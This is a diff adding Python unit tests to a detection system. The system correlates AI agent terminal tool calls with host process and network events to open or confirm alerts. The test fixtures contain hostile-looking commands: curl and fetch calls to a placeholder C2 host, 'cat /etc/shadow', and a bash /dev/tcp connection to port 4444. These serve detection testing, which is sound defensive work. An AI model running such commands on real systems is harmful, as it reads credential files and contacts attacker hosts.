@@ -19,7 +19,7 @@ from runtime.agents_config import load_agents, pattern_match, session_from_conta
 from runtime.command_parse import parse
 from runtime.engine import Store, clean, redact_text
 from runtime.redact import redact_text as redact_direct
-from runtime.semantic_extract import ChainBook, bound_event, extract_entities, untrusted_segments
+from runtime.semantic_extract import ChainBook, bound_event, extract_entities, high_risk_reasons, untrusted_segments
 from runtime.sensor import Adapter, lab_workload, layer_status, service_state
 from runtime.watch_scope import apply
 from scripts.export_timeline import export_window, verify_jsonl, verify_sums
@@ -541,6 +541,141 @@ class ConfirmTimeTests(Harness):
             alert = self.by_rule(rule)[0]
             self.assertEqual(alert['hostConfirmedAt'], self.now, rule)
             self.assertEqual(alert['hostEventTime'], event_time, rule)
+
+
+class ShellNameDeferralTests(Harness):
+    """A shell tool name is not enough to open S03.
+
+    Knowledge context plus terminal `uptime` used to open a semantic alert
+    (reasons=['tool_name']). The same command observed on the host is still
+    benign. A correlated non-allowlisted connection opens S03 at host_confirmed.
+    """
+
+    def knowledge(self, chain, agent, when=None):
+        return self.model(chain, agent, when, segments=[{
+            'role': 'system',
+            'sourceKind': 'knowledge',
+            'digest': hashlib.sha256(chain.encode()).hexdigest(),
+            'excerpt': '<context>benign reference</context>',
+            'confidence': 'observed',
+        }])
+
+    def test_shell_name_only_defers_and_uptime_host_does_not_open(self):
+        entities = {'urls': [], 'hosts': [], 'paths': [], 'commands': ['uptime']}
+        self.assertEqual(high_risk_reasons('terminal', entities, None), ['tool_name'])
+        self.ingest(self.knowledge('up', 'target-01'), self.tool('up', 'target-01', 'terminal', entities, self.now + 1, 'call-up'))
+        self.assertNotIn('S03', self.rules())
+        self.ingest(self.host('up-proc', 'target-01', 'process', self.now + 2, command='uptime'))
+        self.assertNotIn('S03', self.rules())
+        self.ingest(
+            self.knowledge('wrap', 'target-01', self.now + 10),
+            self.tool('wrap', 'target-01', 'terminal', entities, self.now + 11, 'call-wrap'),
+        )
+        self.ingest(self.host('wrap-proc', 'target-01', 'process', self.now + 12, command="sh -c 'uptime'"))
+        self.assertNotIn('S03', self.rules())
+
+    def test_host_matched_open_on_non_allowlisted_network(self):
+        command = 'fetch http://%s/x' % C2
+        entities = {'urls': ['http://%s/x' % C2], 'hosts': [C2], 'paths': [], 'commands': [command]}
+        self.assertEqual(high_risk_reasons('terminal', entities, None), ['tool_name'])
+        policy = {'allowedNetworks': ALLOWED}
+        self.ingest(
+            self.knowledge('fetch', 'target-01'),
+            self.tool('fetch', 'target-01', 'terminal', entities, self.now + 1, 'call-fetch'),
+        )
+        self.assertNotIn('S03', self.rules())
+        self.assertNotIn('S02', self.rules())
+        self.ingest(self.host('fetch-net', 'target-01', 'network', self.now + 2, destination=C2, port=80, policy=policy))
+        s03 = self.by_rule('S03')
+        self.assertEqual(len(s03), 1)
+        self.assertEqual(s03[0]['phase'], 'host_confirmed')
+        self.assertEqual(s03[0]['chainId'], 'fetch')
+        self.assertIn('fetch-net', s03[0]['sampleEventIds'])
+        s02 = self.by_rule('S02')
+        self.assertEqual(len(s02), 1)
+        self.assertEqual(s02[0]['phase'], 'host_confirmed')
+        self.assertEqual(s02[0]['chainId'], 'fetch')
+
+    def test_allowlisted_fetch_is_not_confirmed(self):
+        entities = {'urls': ['http://192.0.2.10/status'], 'hosts': ['192.0.2.10'], 'paths': [], 'commands': ['fetch http://192.0.2.10/status']}
+        self.assertEqual(high_risk_reasons('terminal', entities, None), ['tool_name'])
+        policy = {'allowedNetworks': ALLOWED}
+        self.ingest(
+            self.knowledge('ok', 'target-01'),
+            self.tool('ok', 'target-01', 'terminal', entities, self.now + 1, 'call-ok'),
+            self.host('ok-net', 'target-01', 'network', self.now + 2, destination='192.0.2.10', port=80, policy=policy),
+        )
+        self.assertNotIn('S03', self.rules())
+        self.assertNotIn('S02', self.rules())
+
+    def test_curl_shadow_and_dev_tcp_still_open(self):
+        policy = {'allowedNetworks': ALLOWED}
+        curl = 'curl http://%s/x' % C2
+        curl_entities = {'urls': ['http://%s/x' % C2], 'hosts': [C2], 'paths': [], 'commands': [curl]}
+        self.ingest(
+            self.knowledge('curl', 'target-01'),
+            self.tool('curl', 'target-01', 'terminal', curl_entities, self.now + 1, 'call-curl', policy=policy),
+        )
+        opened = [item for item in self.by_rule('S03') if item['chainId'] == 'curl']
+        self.assertEqual(len(opened), 1)
+        self.assertEqual(opened[0]['phase'], 'semantic')
+        self.ingest(self.host('curl-net', 'target-01', 'network', self.now + 2, destination=C2, port=80, policy=policy))
+        confirmed = next(item for item in self.by_rule('S03') if item['chainId'] == 'curl')
+        self.assertEqual(confirmed['phase'], 'host_confirmed')
+        self.assertIn('curl-net', confirmed['sampleEventIds'])
+        self.assertEqual([item['chainId'] for item in self.by_rule('S02')], ['curl'])
+
+        shadow = {'urls': [], 'hosts': [], 'paths': ['/etc/shadow'], 'commands': ['cat /etc/shadow']}
+        self.assertIn('sensitive_or_persist_path', high_risk_reasons('terminal', shadow, None))
+        self.ingest(
+            self.knowledge('shadow', 'target-01', self.now + 10),
+            self.tool('shadow', 'target-01', 'terminal', shadow, self.now + 11, 'call-shadow'),
+        )
+        self.assertEqual(next(item for item in self.by_rule('S03') if item['chainId'] == 'shadow')['phase'], 'semantic')
+
+        tcp = 'bash -c "exec 3<>/dev/tcp/%s/4444"' % C2
+        tcp_entities = {'urls': [], 'hosts': [], 'paths': [], 'commands': [tcp]}
+        self.assertIn('command_pattern', high_risk_reasons('terminal', tcp_entities, None))
+        self.ingest(
+            self.knowledge('tcp', 'target-01', self.now + 20),
+            self.tool('tcp', 'target-01', 'terminal', tcp_entities, self.now + 21, 'call-tcp'),
+        )
+        self.assertEqual(next(item for item in self.by_rule('S03') if item['chainId'] == 'tcp')['phase'], 'semantic')
+
+    def test_one_host_confirms_nearest_tool_only(self):
+        policy = {'allowedNetworks': ALLOWED}
+        entities = {'urls': ['http://%s/x' % C2], 'hosts': [C2], 'paths': [], 'commands': ['curl http://%s/x' % C2]}
+        events = []
+        for index in range(3):
+            chain = 'near-%d' % index
+            events.append(self.knowledge(chain, 'target-01', self.now + index))
+            events.append(self.tool(chain, 'target-01', 'terminal', entities, self.now + index + 0.5, 'call-%d' % index, policy=policy))
+        self.ingest(*events)
+        self.assertEqual([item['phase'] for item in self.by_rule('S03')], ['semantic', 'semantic', 'semantic'])
+        self.ingest(self.host('shared-net', 'target-01', 'network', self.now + 4, destination=C2, port=80, policy=policy))
+        confirmed = [item for item in self.by_rule('S03') if item['phase'] == 'host_confirmed']
+        semantic = [item for item in self.by_rule('S03') if item['phase'] == 'semantic']
+        self.assertEqual([item['chainId'] for item in confirmed], ['near-2'])
+        self.assertEqual(sorted(item['chainId'] for item in semantic), ['near-0', 'near-1'])
+        self.assertIn('shared-net', confirmed[0]['sampleEventIds'])
+        self.assertTrue(all('shared-net' not in item['sampleEventIds'] for item in semantic))
+        self.assertEqual([item['chainId'] for item in self.by_rule('S02')], ['near-2'])
+
+    def test_nearer_uptime_does_not_steal_curl_confirmation(self):
+        policy = {'allowedNetworks': ALLOWED}
+        curl = {'urls': ['http://%s/x' % C2], 'hosts': [C2], 'paths': [], 'commands': ['curl http://%s/x' % C2]}
+        uptime = {'urls': [], 'hosts': [], 'paths': [], 'commands': ['uptime']}
+        self.ingest(
+            self.knowledge('old-curl', 'target-01'),
+            self.tool('old-curl', 'target-01', 'terminal', curl, self.now + 1, 'call-curl', policy=policy),
+            self.knowledge('new-up', 'target-01', self.now + 2),
+            self.tool('new-up', 'target-01', 'terminal', uptime, self.now + 3, 'call-up'),
+        )
+        self.ingest(self.host('curl-net', 'target-01', 'network', self.now + 4, destination=C2, port=80, policy=policy))
+        self.assertNotIn('new-up', [item['chainId'] for item in self.by_rule('S03')])
+        curl_alert = next(item for item in self.by_rule('S03') if item['chainId'] == 'old-curl')
+        self.assertEqual(curl_alert['phase'], 'host_confirmed')
+        self.assertEqual([item['chainId'] for item in self.by_rule('S02')], ['old-curl'])
 
 
 class FanotifyDedupTests(unittest.TestCase):
